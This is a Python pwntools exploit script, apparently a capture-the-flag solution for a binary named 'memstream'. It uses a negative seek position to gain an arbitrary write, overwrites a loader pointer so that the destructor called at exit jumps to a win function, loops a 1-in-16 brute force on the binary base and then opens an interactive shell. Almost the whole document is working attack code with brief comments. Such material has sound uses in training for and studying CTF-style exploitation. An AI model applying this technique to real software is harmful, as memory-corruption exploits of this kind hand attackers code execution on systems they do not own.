from pwn import *
import warnings
warnings.simplefilter("ignore", category=BytesWarning)

# context.log_level = "debug"	# have pwntools log all sent and received data

elf = context.binary = ELF("./memstream")

def run_exploit():
	if (args.REMOTE):
		p = remote("127.0.0.1", 5000)
	else:
		p = elf.process()
		# gdb.attach(p)
		# pause()

	# offsets
	gbuf_to_ld_ptr = -0x41060 + 0x3b2e0	# offset of g_buf to the pointer which points to binary base in ld
	gbuf_to_data_ptr = -0x58	# offset of g_buf to the pointer in data section
	# the offset of the pointer at data section from the offset
	# that ld gets from the base of the binary as a function pointer
	dtors_ptr_to_data_ptr = 0x4008 - 0x3d88
	binary_base = 0x2000	# we have to get lucky on the MSB of this one :) (1/16 bruteforce)
	win = 0x1229	# offset of win function from binary base

	# trigger arbitary write by giving a negative seek position
	def arb_write(offset, what):
		p.sendlineafter("> ", "1")
		p.sendlineafter("Position: ", str(offset))
		p.sendlineafter("> ", "3")
		p.sendlineafter("Size: ", str(len(what)))
		p.sendafter("Data: ", what)

	arb_write(gbuf_to_data_ptr, p64(binary_base + win).rstrip(b"\0"))
	arb_write(gbuf_to_ld_ptr, p64(binary_base + dtors_ptr_to_data_ptr).rstrip(b"\0"))

	# causes the binary to exit and makes ld try to execute __do_global_dtors_aux
	# which now will execute win() instead.
	p.sendlineafter("> ", "4")
	try:
		p.sendline(b"id")
		p.recvline()
	except EOFError:
		p.close()
		return False
	p.interactive()
	return True

while not run_exploit():
	pass
